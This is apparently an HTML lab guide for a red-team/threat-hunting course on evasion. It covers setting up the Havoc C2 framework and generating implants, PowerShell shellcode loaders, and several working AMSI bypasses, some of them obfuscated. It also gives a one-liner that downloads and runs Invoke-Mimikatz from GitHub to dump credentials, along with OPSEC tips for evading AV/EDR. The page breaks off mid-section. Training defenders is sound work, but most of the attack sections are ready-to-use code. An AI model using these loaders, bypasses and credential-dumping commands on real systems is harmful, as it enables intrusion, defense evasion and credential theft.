<!DOCTYPE HTML>
<html lang="en" class="sidebar-visible no-js light">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title></title>
        
        <meta name="robots" content="noindex" />
        

        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff" />

        <link rel="shortcut icon" href="favicon.png">
        <link rel="stylesheet" href="css/variables.css">
        <link rel="stylesheet" href="css/general.css">
        <link rel="stylesheet" href="css/chrome.css">
        <link rel="stylesheet" href="css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
        <link href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css">
        <link href="https://fonts.googleapis.com/css?family=Source+Code+Pro:500" rel="stylesheet" type="text/css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="highlight.css">
        <link rel="stylesheet" href="tomorrow-night.css">
        <link rel="stylesheet" href="ayu-highlight.css">

        <!-- Custom theme stylesheets -->
        

        
    </head>
    <body>
        <!-- Provide site root to javascript -->
        <script type="text/javascript">
            var path_to_root = "";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "light" : "light";
        </script>

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script type="text/javascript">
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script type="text/javascript">
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('no-js')
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add('js');
        </script>

        <!-- Hide / unhide sidebar before it is displayed -->
        <script type="text/javascript">
            var html = document.querySelector('html');
            var sidebar = 'hidden';
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            }
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <div id="sidebar-scrollbox" class="sidebar-scrollbox">
                <ol class="chapter"><li class="expanded "><a href="intro.html"><strong aria-hidden="true">1.</strong> Chapter 1 : Intro </a></li><li><ol class="section"><li class="expanded "><a href="havoc.html"><strong aria-hidden="true">1.1.</strong> Havoc C2</a></li><li class="expanded "><a href="powershell.html"><strong aria-hidden="true">1.2.</strong> Powershell</a></li><li class="expanded "><a href="amsi.html"><strong aria-hidden="true">1.3.</strong> AMSI</a></li><li class="expanded "><a href="static.html"><strong aria-hidden="true">1.4.</strong> Static Analysis</a></li><li class="expanded "><a href="chapter_1.1.html"><strong aria-hidden="true">1.5.</strong> Metasploit Basics</a></li><li class="expanded "><a href="shellcode.html"><strong aria-hidden="true">1.6.</strong> Shellcode</a></li><li><ol class="section"><li class="expanded "><a href="functions.html"><strong aria-hidden="true">1.6.1.</strong> WIN32api and Functions</a></li><li><ol class="section"><li class="expanded "><a href="lab1.1.html"><strong aria-hidden="true">1.6.1.1.</strong> Lab - Payloads</a></li><li class="expanded "><a href="lab_shellcode.html"><strong aria-hidden="true">1.6.1.2.</strong> Lab - Shellcode</a></li><li class="expanded "><a href="lab_basic.html"><strong aria-hidden="true">1.6.1.3.</strong> Lab - Basic Loader</a></li><li class="expanded "><a href="lab_staged.html"><strong aria-hidden="true">1.6.1.4.</strong> Lab - Remote Loader</a></li></ol></li></ol></li><li class="expanded "><a href="defender.html"><strong aria-hidden="true">1.7.</strong> Windows Defender</a></li><li><ol class="section"><li class="expanded "><a href="heuristics.html"><strong aria-hidden="true">1.7.1.</strong> Heuristics</a></li><li class="expanded "><a href="uac.html"><strong aria-hidden="true">1.7.2.</strong> UAC</a></li><li class="expanded "><a href="hooks.html"><strong aria-hidden="true">1.7.3.</strong> Hooks</a></li><li class="expanded "><a href="etw.html"><strong aria-hidden="true">1.7.4.</strong> ETW</a></li><li class="expanded "><a href="syscalls.html"><strong aria-hidden="true">1.7.5.</strong> Syscalls</a></li><li class="expanded "><a href=".kernelcallbacks.html"><strong aria-hidden="true">1.7.6.</strong> Kernel Callbacks</a></li><li class="expanded "><a href="edr.html"><strong aria-hidden="true">1.7.7.</strong> EDR Stuff</a></li></ol></li><li class="expanded "><a href="evasion.html"><strong aria-hidden="true">1.8.</strong> Evasion</a></li><li><ol class="section"><li class="expanded "><a href="litterbox.html"><strong aria-hidden="true">1.8.1.</strong> Forensics - Litterbox</a></li></ol></li></ol></li><li class="expanded "><a href="mdbooktricks.html"><strong aria-hidden="true">2.</strong> Chapter Extra </a></li></ol>
            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                
                <div id="menu-bar" class="menu-bar">
                    <div id="menu-bar-sticky-container">
                        <div class="left-buttons">
                            <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                                <i class="fa fa-bars"></i>
                            </button>
                            <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                                <i class="fa fa-paint-brush"></i>
                            </button>
                            <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                                <li role="none"><button role="menuitem" class="theme" id="light">Light (default)</button></li>
                                <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                                <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                                <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                                <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                            </ul>
                            
                            <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                                <i class="fa fa-search"></i>
                            </button>
                            
                        </div>

                        <h1 class="menu-title"></h1>

                        <div class="right-buttons">
                            <a href="print.html" title="Print this book" aria-label="Print this book">
                                <i id="print-button" class="fa fa-print"></i>
                            </a>
                            
                        </div>
                    </div>
                </div>

                
                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" name="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>
                

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script type="text/javascript">
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1><a class="header" href="#intro--threathunting-academy---evasion" id="intro--threathunting-academy---evasion">Intro : Threathunting Academy - Evasion</a></h1>
<p><img src="./images/cr_hackers.jpg" alt="image" /></p>
<p>Welcome to the <strong>&quot;Threathunting Academy - Evasion&quot;</strong>  this is the official lab guide that will guide you through the infrastructure. Students will all have their own <strong>Windows 10 client machine</strong>, a shared central <code>Domain Controller</code> and a Kali <code>Red Team server and Forensics machine</code>. All logs are centrally collected on and Ubuntu server running Elasticsearch and Kibana.</p>
<h1><a class="header" href="#havoc-c2" id="havoc-c2">Havoc C2</a></h1>
<p>With a phletora of attack frameworks available (https://howto.thec2matrix.com), the most important requirement is <em>malleability/customizability</em>. Commonly known frameworks such as <code>metasploit</code>, <code>cobalt strike</code>, <code>Empire</code> (Starkiller GUI), <code>BruteRatel</code>, <code>Mythic C2</code>, <code>covenant</code> and <code>sliver</code> come to mind. In this training we'll be using a rather new, cobalt strike like framework called <code>Havoc C2</code>.</p>
<p><img src="./images/havoc.jpg" alt="Screenshot" /></p>
<p><a href="https://github.com/HavocFramework/Havoc?tab=readme-ov-file">https://github.com/HavocFramework/Havoc?tab=readme-ov-file</a></p>
<p>Attack frameworks typically all consist of the following elements</p>
<ol>
<li>
<p><em><strong>Teamserver</strong></em>
The central C2 server that receives C2 traffic from implants on its listeners (i.e. <code>LHOST</code> in metasploit), management connections from the client as well as it typically also hosts payloads.</p>
</li>
<li>
<p><em><strong>Client</strong></em>
This is the operater console that connects to the teamserver and allows the adversary to manage listeners, malleable profiles, payloads and implants.</p>
</li>
<li>
<p><em><strong>Implant, beacon, demon, ...</strong></em> 
This is the actual malicious code that communicates back over a C2 channel to the teamserver, very often this is primarily a stager/loader (a tiny program that will download the actual malicious code and typically inject it in to memory of a current or remote process.) - attack frameworks will provide a <code>payload generator</code> that can build different types of payloads (Exe's, dll's, shellcode, etc...).</p>
</li>
</ol>
<p>The most known is probably MSFVenom from the <code>Metasploit Framework</code>.</p>
<p><img src="./images/havoc_msfvenom.jpg" alt="Screenshot" /></p>
<ol start="4">
<li><em><strong>C2 Redirectors</strong></em> 
We won't be using this in the lab, but in real world scenarios these functies as proxies between the victim and the team-server (It's easier to pop up a new proxy, than a completely new teams-server)</li>
</ol>
<p>Havoc C2 is the framework we will be using in this training, however the techniques we'll be using can be utilized in each of beforementioned frameworks.</p>
<blockquote>
<p>On Kali we can simply install Havoc C2 with the following command (this is already done)</p>
</blockquote>
<pre><code class="language-bash">apt install havoc
</code></pre>
<h1><a class="header" href="#creating-a-custom-profile" id="creating-a-custom-profile">Creating a custom profile</a></h1>
<p>Let's have a look at the custom profile we have created for this team server. The profile will have the general settings such as users that can log in to the team server, user agents for HTTP/HTTPs listeners, and how our implants will behave.</p>
<blockquote>
<p><em><strong>OPSEC HINT</strong></em> : Always customize your profiles as default profiles are almost often finger printed by AV/EDR.</p>
</blockquote>
<pre><code class="language-bash">sudo nano /opt/Havoc/profiles/custom.yaotl
</code></pre>
<p>This is the content of the <code>custom.yoatl</code> profile:</p>
<pre><code class="language-yaml">Teamserver {
    Host = &quot;0.0.0.0&quot;
    Port = 40056

    Build {
        Compiler64 = &quot;/usr/bin/x86_64-w64-mingw32-gcc&quot;
        Nasm = &quot;/usr/bin/nasm&quot;
    }
}

Operators {
    user &quot;Threatadmin&quot; {
        Password = &quot;Threathunt25&quot;
    }
}

# demon setting.

Demon {
    Sleep = 2
    Jitter = 20

    TrustXForwardedFor = false

    Injection {
        Spawn64 = &quot;C:\\Windows\\System32\\Werfault.exe&quot;
    }

    Binary {
        ReplaceStrings-x64 = {
            &quot;demon.x64.dll&quot;: &quot;&quot;,
            &quot;This program cannot be run in DOS mode.&quot;: &quot;&quot;,
        }
    }
}
</code></pre>
<h1><a class="header" href="#running-the-teamserver" id="running-the-teamserver">Running the teamserver</a></h1>
<p><img src="./images/havoc_team.jpg" alt="Screenshot" /></p>
<pre><code class="language-bash">havoc server --profile /opt/Havoc/profiles/custom.yoatl -v --debug
</code></pre>
<p>Let's set thsis up as a service:</p>
<pre><code class="language-bash">sudo nano /lib/systemd/system/havocservice.service
</code></pre>
<pre><code class="language-yaml">[Unit]
Description=HavocServer
After=network.target

[Service]
Type=idle
Restart=on-failure
User=root
ExecStart=&quot;/usr/bin/havoc&quot; &quot;server&quot; &quot;--profile&quot; &quot;/opt/havoc/profiles/https.yaotl&quot;

[Install]

</code></pre>
<p>Change the file permisions, enable and start the service:</p>
<pre><code>sudo chmod 644 /lib/systemd/system/
sudo systemctl daemon-reload
enable havocserver.service
sudo systemctl start havocserver.service 
systemctl status havocserver.service
&quot;

# Running the client

![Screenshot](./images/havoc_newtab.jpg)

In your terminal open a new tab, then run the following command:


```code
havoc client
</code></pre>
<p>We can now log in to our teamserver using the user <code>Threatadmin</code> and the password whcih we defined in the custom Havoc C2 profile.</p>
<p><img src="./images/havoc_login.jpg" alt="Screenshot" /></p>
<p>Let's start by setting up a listener:</p>
<p><a href="https://havocframework.com/docs/profiles">https://havocframework.com/docs/profiles</a></p>
<p>In the Havoc GUI to to <code>view</code> and select listeners.</p>
<p><img src="./images/havoc_viewlistener.jpg" alt="Screenshot" /></p>
<blockquote>
<p><em><strong>OPSEC HINT</strong></em> : Always customize your listeners by using valid user agents, also by using HTTPs we make sure our connections are harder to inspect. This is a nice website to generate user agents strings: <a href="https://useragents.io/parse/my-user-agent">https://useragents.io/parse/my-user-agent</a></p>
</blockquote>
<p>Here's a regular chrome user agent from your windows machine:</p>
<pre><code class="language-yaml">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
</code></pre>
<p>Let's add an HTTPs listener, click on <code>Add</code> and enter the listener configuration. Give the listener a name, select <code>Https</code> and past the user agent in the correct field. Click on <code>Save</code></p>
<blockquote>
<p>Make sure you select the correct IP addres (host) for your machine! You can double check by running ifconfig.</p>
</blockquote>
<p><img src="./images/ifconfig.jpg" alt="Screenshot" /></p>
<p><img src="./images/havoc_addlistener.jpg" alt="Screenshot" /></p>
<p>We can also add this to our Havoc profile, so that all these settings are applied when starting the team server. But before we do that, lets keep our OPSEC in mind, we need HTTPS - and we bettter not use the default SSL certificates, those might be signatured. </p>
<p>Let's create a self-signed SSL certifacate (PEM) and key file - Self signed certificates are of course not ideal - in a real world scenario we'd have them signed by a trusted PKI.</p>
<pre><code class="language-bash">cd /opt/havoc/certs
openssl req -new -newkey rsa:4096 -x509 -sha256 -days 365 -nodes -out public.crt -keyout private.key
</code></pre>
<p>Output:</p>
<p><img src="./images/havoc_certs.jpg" alt="Screenshot" /></p>
<p>Let's copy the custom.yoatl profile to a new HTTPS template where we'll add the certs, user-agent, listener settings and so on</p>
<pre><code class="language-bash">cd /opt/havoc/profiles
sudo cp custom.yoatl https.yoatl
sudo nano /opt/Havoc/profiles/custom.yaotl
</code></pre>
<p>This is the new content of the custom <code>HTTPS.yoatl</code> profile:</p>
<pre><code class="language-yaml">Teamserver {
    Host = &quot;0.0.0.0&quot;
    Port = 40056

    Build {
        Compiler64 = &quot;/usr/bin/x86_64-w64-mingw32-gcc&quot;
        Nasm = &quot;/usr/bin/nasm&quot;
    }
}

Operators {
    user &quot;Threatadmin&quot; {
        Password = &quot;Threathunt25&quot;
    }
}

# HTTPS LISTENER AND CERTS

Listeners {
    Http {
        Name         = &quot;HTTPs Listener&quot;
        Hosts        = [&quot;10.0.0.7&quot;]
        #KillDate     = &quot;2006-01-02 15:04:05&quot; 
        #WorkingHours = &quot;8:00-17:00&quot;
        HostBind     = &quot;0.0.0.0&quot;
        PortBind     = 443
        PortConn     = 443
        HostRotation = &quot;round-robin&quot;
        Secure       = true
        UserAgent    = &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36&quot;
        Cert {
                Cert = &quot;/opt/havoc/certs/public.crt&quot;
                Key = &quot;/opt/havoc/certs/private.key&quot;
        }
     }
}
# demon setting.

Demon {
    Sleep = 2
    Jitter = 20

    TrustXForwardedFor = false

    Injection {
        Spawn64 = &quot;C:\\Windows\\System32\\Werfault.exe&quot;
        Spawn32 = &quot;C:\\Windows\\SysWOW64\notepad.exe&quot;
    }

    Binary {
        ReplaceStrings-x64 = {
            &quot;demon.x64.dll&quot;: &quot;&quot;,
            &quot;This program cannot be run in DOS mode.&quot;: &quot;&quot;,
        }
    }
}
</code></pre>
<p>Now close your Havoc Teamserver and client in terminal (control-c) and start the teamserver again with your new profile:</p>
<pre><code class="language-bash">havoc server --profile /opt/havoc/profiles/https.yaotl -v --debug
</code></pre>
<p>Open a second tab in your terminal and run:</p>
<pre><code class="language-bash">havoc client
</code></pre>
<p>On your windows machine when we browse with Chrome to the HTTPs listener (https://10.0.0.7:443), we'll now see our own custom self-signed certificate - one IOC less for AV/EDR to trigger on!</p>
<p><img src="./images/havoc_certswin.jpg" alt="Screenshot" /></p>
<p>We'll create a vanilla demon payload as an executable, make sure all settings are like in the screenshot below (we'll go into the advanced evasion settings later on), save the payload in /opt/havoc/payloads directory:</p>
<p><img src="./images/havoc_payload.jpg" alt="Screenshot" /></p>
<p>On your windows machine use <code>Chrome</code> and got to <a href="http:%5C%5CYourKaliIP:9090%5C">http:\\YourKaliIP:9090\</a> and download the demon to C:\Temp (this is whitelisted in MS Defender)</p>
<p>(configure chrome to allow exe downloads, turn off smartscreen)</p>
<p><img src="./images/havoc_updog.jpg" alt="Screenshot" /></p>
<p><img src="./images/havoc_demon.jpg" alt="Screenshot" /></p>
<p><img src="./images/havoc_session.jpg" alt="Screenshot" /></p>
<p><img src="./images/havoc_session2.jpg" alt="Screenshot" /></p>
<p>We can now interact with this implant by right-clicking the icon and selecting <code>&quot;Interact&quot;</code>.</p>
<p><img src="./images/havoc_interact1.jpg" alt="Screenshot" /></p>
<p><img src="./images/havoc_interact2.jpg" alt="Screenshot" /></p>
<h1><a class="header" href="#havoc-modules" id="havoc-modules">Havoc Modules</a></h1>
<p><em><strong>dotnet</strong></em>
inline-execute
execute</p>
<p><em><strong>Inline - execute (BOF Loader!!!)</strong></em></p>
<blockquote>
<p>OPSEC Hint : When running the shell command, the process hosting your beacon/implant will spawn a child process, run the command and exit the child process. This is quite noisy compared to running everything in memory in the same process. Also command-line logging (eventlogs, sysmon and EDR's will log the commands.)</p>
</blockquote>
<p><em><strong>shell</strong></em></p>
<p><em><strong>shellcode</strong></em> </p>
<pre><code class="language-code">shellcode inject x64 6556 /opt/havoc/payloads/demon.x64.bin
</code></pre>
<blockquote>
<p>Explain sacrificial process - advatages/disadvantages (command line logging, stability, patching, not touching other processes)</p>
</blockquote>
<h1><a class="header" href="#powershell" id="powershell">Powershell</a></h1>
<p>AMSI
Invoke-Obfuscastion
powershell shellcode loader (without amsi bypass)</p>
<pre><code class="language-powershell">$shellcode = @(0x90,0x90,0x90,0x90) # Replace with your shellcode

$code = @&quot;
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport(&quot;kernel32.dll&quot;, SetLastError=true)] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport(&quot;kernel32.dll&quot;, SetLastError=true)] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport(&quot;msvcrt.dll&quot;, SetLastError=true)] public static extern IntPtr memcpy(IntPtr dest, byte[] src, uint count);
}
&quot;@

Add-Type -TypeDefinition $code

# Allocate memory
$mem = [Win32]::VirtualAlloc([IntPtr]::Zero, $shellcode.Length, 0x3000, 0x40)

# Copy shellcode to memory
[Win32]::memcpy($mem, $shellcode, $shellcode.Length)

# Create thread to execute shellcode
$thread = [Win32]::CreateThread([IntPtr]::Zero, 0, $mem, [IntPtr]::Zero, 0, [IntPtr]::Zero)

# Wait for thread to exit (optional)
[System.Runtime.InteropServices.Marshal]::WaitForSingleObject($thread, 0xFFFFFFFF)
</code></pre>
<p>Shorter version:</p>
<pre><code class="language-powershell">$shellcode = @(0x90,0x90,0x90,0x90) # Replace with your shellcode

# Allocate memory
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($shellcode.Length)

# Copy shellcode to memory
[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $mem, $shellcode.Length)

# Create thread to execute shellcode
$thread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($mem, [System.Threading.ThreadStart])

# Start the thread
$thread.Invoke()

# Wait for thread to exit (optional)
[System.Threading.Thread]::Sleep(-1)
</code></pre>
<h1><a class="header" href="#amsi-anti-malware-scanning-interface" id="amsi-anti-malware-scanning-interface">AMSI (Anti-Malware Scanning Interface)</a></h1>
<blockquote>
<p>WARNING : Amsi loads into powershell, with dotner amsi integrates with the clr which loads AMSI on demand.</p>
</blockquote>
<p>AmsiScanBuffer
AmsiScanString
AssemblyLoad</p>
<p>Show api calls made (user to kernel/syscall)</p>
<p>Languages</p>
<hr />
<ul>
<li>powershell (scripting)</li>
<li>vb.net (scripting)</li>
<li>c# (compiled)</li>
<li>f# (compiled)</li>
</ul>
<p><img src="./images/dotnet.jpeg" alt="dotnet" /></p>
<p>AMSI</p>
<hr />
<p>Introduced in June 2015.</p>
<p>The Windows Antimalware Scan Interface (AMSI) is a versatile interface standard that allows your applications and services to integrate with any antimalware product that's present on a machine. AMSI provides enhanced malware protection for your end-users and their data, applications, and workloads.</p>
<p>AMSI is agnostic of antimalware vendor; it's designed to allow for the most common malware scanning and protection techniques provided by today's antimalware products that can be integrated into applications. It supports a calling structure allowing for file and memory or stream scanning, content source URL/IP reputation checks, and other techniques.</p>
<p>The AMSI feature is integrated into these components of <code>Windows 10</code>:</p>
<ul>
<li>User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)</li>
<li>PowerShell <code>v5</code> (scripts, interactive use, and dynamic code evaluation)</li>
<li>Windows Script Host (Wscript.exe and Cscript.exe) (scripts and dynamic </li>
<li>Office365 (JavaScript/VBA)</li>
<li>Windows Management Instrumentation (WMI)</li>
<li>.Net Framework 4.8 (Scanning for all assemblies) - <em><strong>NEW</strong></em></li>
</ul>
<blockquote>
<p><strong>Runtime – Antimalware Scanning for All Assemblies</strong> : In previous versions of .NET Framework, Windows Defender or third-party antimalware software would automatically scan all assemblies loaded from disk for malware. However, assemblies loaded from elsewhere, such as by using Assembly.Load(byte[]), would not be scanned and could potentially carry viruses undetected.</p>
</blockquote>
<p><a href="https://devblogs.microsoft.com/dotnet/announcing-net-framework-4-8-early-access-build-3694/">https://devblogs.microsoft.com/dotnet/announcing-net-framework-4-8-early-access-build-3694/</a></p>
<p>.NET Framework 4.8 on Windows 10 triggers scans for those assemblies by Windows Defender and many other antimalware solutions that implement the Antimalware Scan Interface. We expect that this will make it harder for malware to disguise itself in .NET programs.</p>
<p>In its default configuration, macros are scanned at runtime via AMSI except in the following scenarios:</p>
<ul>
<li>Documents opened while macro security settings are set to “Enable All Macros”</li>
<li>Documents opened from trusted locations</li>
<li>Documents that are trusted documents</li>
<li>Documents that contain VBA that is digitally signed by a trusted publisher</li>
</ul>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/amsi/how-amsi-helps">https://docs.microsoft.com/en-us/windows/win32/amsi/how-amsi-helps</a></p>
<blockquote>
<p>Runtime – Antimalware Scanning for All Assemblies
In previous versions of .NET Framework, Windows Defender or third-party antimalware software would automatically scan all assemblies loaded from disk for malware. However, assemblies loaded from elsewhere, such as by using Assembly.Load(byte[]), would not be scanned and could potentially carry viruses undetected.</p>
<p>.NET Framework 4.8 (released April 18th on Windows 10 triggers scans for those assemblies by Windows Defender and many other antimalware solutions that implement the Antimalware Scan Interface. We expect that this will make it harder for malware to disguise itself in .NET programs.</p>
<p><strong>LINK</strong> : <a href="https://devblogs.microsoft.com/dotnet/announcing-net-framework-4-8-early-access-build-3694/">https://devblogs.microsoft.com/dotnet/announcing-net-framework-4-8-early-access-build-3694/</a></p>
<p><strong>LINK</strong> : <a href="https://en.wikipedia.org/wiki/.NET_Framework_version_history">https://en.wikipedia.org/wiki/.NET_Framework_version_history</a></p>
</blockquote>
<p><img src="./images/amsi7archi.jpg" alt="image" /></p>
<h2><a class="header" href="#supported-os" id="supported-os">Supported OS</a></h2>
<ul>
<li>Windows 10 PRO/ENTERPRISE and Windows Server 2016</li>
<li>Windows Server 2019</li>
</ul>
<h2><a class="header" href="#supported-3rd-party-antivirusedr-vendors" id="supported-3rd-party-antivirusedr-vendors">Supported 3rd party Antivirus/EDR vendors</a></h2>
<ul>
<li>Windows Defender</li>
<li>Carbon Black Defense</li>
<li>Crowdstrike Falcon</li>
<li>Kaspersky</li>
<li>McAfee Endpoint Security 10.6.0 </li>
<li>Sophos</li>
<li>Symantec (v14.3 and later)</li>
</ul>
<p><strong>LINK</strong> : <a href="https://github.com/subat0mik/whoamsi">https://github.com/subat0mik/whoamsi</a></p>
<p>To check which version of .net and the CLR is installed open a powershell prompt and type the following:</p>
<pre><code class="language-code">$psversiontable
[System.Reflection.Assembly]::GetExecutingAssembly().ImageRuntimeVersion
$dotnet = [System.Reflection.Assembly]::Load(&quot;mscorlib&quot;)
$dotnet.GetName().Version
</code></pre>
<p><img src="./images/dotnetversion.jpg" alt="image" /></p>
<p>Check Powershell installed on the system:</p>
<pre><code class="language-yaml">(Get-ItemProperty HKLM:\SOFTWARE\Microsoft\PowerShell\*\PowerShellEngine -Name PowerShellVersion).PowerShellVersion
</code></pre>
<h2><a class="header" href="#amsitest" id="amsitest">AMSITEST</a></h2>
<pre><code class="language-yaml">It '&quot;Antimalware Scan Interface&quot; is working' {
    # AMSI test string 'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386'
    # (in the following as an obfuscated string)
    # must throw an error if executed (blocked by AMSI)
    $TestString = &quot;FHJ+YHoTZ1ZARxNgUl5DX1YJEwRWBAFQAFBWHgsFAlEeBwAACh4LBAcDHgNSUAIHCwdQAgALBRQ=&quot;
    $Bytes = [Convert]::FromBase64String($TestString)
    $String = -join ($bytes | ForEach-Object { [char]($_ -bxor 0x33)})
    { Invoke-Expression -Command $String } | Should Throw
}
</code></pre>
<h2><a class="header" href="#amsibypass" id="amsibypass">AMSIBYPASS</a></h2>
<p>Works on 1803 and before</p>
<blockquote>
<p>This bypass does not require administrator rights!!!</p>
</blockquote>
<pre><code class="language-yaml">[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic, Static').SetValue($null,$true)
</code></pre>
<p>Works on 1903, 1909 and before</p>
<pre><code class="language-yaml">sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  &quot;{1}{0}&quot;-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( &quot;1Q2U&quot;  +&quot;zX&quot;  )  -VaL ).&quot;A`ss`Embly&quot;.&quot;GET`TY`Pe&quot;((  &quot;{6}{3}{1}{4}{2}{0}{5}&quot; -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) ).&quot;g`etf`iElD&quot;(  ( &quot;{0}{2}{1}&quot; -f'amsi','d','InitFaile'  ),(  &quot;{2}{4}{0}{1}{3}&quot; -f 'Stat','i','NonPubli','c','c, ' )).&quot;sE`T`VaLUE&quot;(  ${n`ULl},${t`RuE} )
</code></pre>
<p>List <code>dirty</code> words: </p>
<pre><code class="language-yaml">[ScriptBlock].GetField('signatures', 'NonPublic, Static').GetValue($null)
</code></pre>
<hr />
<p>https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell?tab=readme-ov-file#Patch-the-providers-DLL-of-Microsoft-MpOav.dll</p>
<p>check which processes have amsi.dll loaded</p>
<p>Get-Process | where {$_.modules.ModuleName -eq 'Amsi.dll'}</p>
<p>Los er door:</p>
<pre><code class="language-powershell">$w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))
$field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static')
$field.SetValue($null,$true)
</code></pre>
<p>https://medium.com/@sam.rothlisberger/amsi-bypass-memory-patch-technique-in-2024-f5560022752b</p>
<p>And finally AMSI.FAIL</p>
<p>or this also works</p>
<pre><code class="language-powershell">class TrollAMSI{static [int] M([string]$c, [string]$s){return 1}}
$o = [Ref].Assembly.GetType('System.Ma'+'nag'+'eme'+'nt.Autom'+'ation.A'+'ms'+'iU'+'ti'+'ls').GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq ScanContent
$t = [TrollAMSI].GetMethods() | Where-Object Name -eq 'M'
#[System.Runtime.CompilerServices.RuntimeHelpers]::PrepareMethod($t.MethodHandle)  
#[System.Runtime.CompilerServices.RuntimeHelpers]::PrepareMethod($o.MethodHandle)
[System.Runtime.InteropServices.Marshal]::Copy(@([System.Runtime.InteropServices.Marshal]::ReadIntPtr([long]$t.MethodHandle.Value + [long]8)),0, [long]$o.MethodHandle.Value + [long]8,1)
</code></pre>
<p>then run</p>
<pre><code class="language-powershell">IEX (New-Object Net.WebClient).DownloadString(&quot;https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1&quot;); Invoke-Mimikatz -Command privilege::debug; Invoke-Mimikatz -DumpCreds;
</code></pre>
<p>No detections, AMSI is disabled</p>
<h2><a class="header" href="#amsi-bypass-in-net-binaries" id="amsi-bypass-in-net-binaries">AMSI Bypass in .NET Binaries</a></h2>
<p>Yes, the AMSI bypass technique provided, which uses reflection to set the <code>amsiInitFailed</code> field to <code>$true</code>, will also work in .NET binaries, not just in PowerShell.</p>
<p><strong>Understanding the Technique:</strong></p>
<ul>
<li><strong>Reflection:</strong> The core of this bypass relies on .NET reflection, which allows code to inspect and modify types, fields, and methods at runtime.</li>
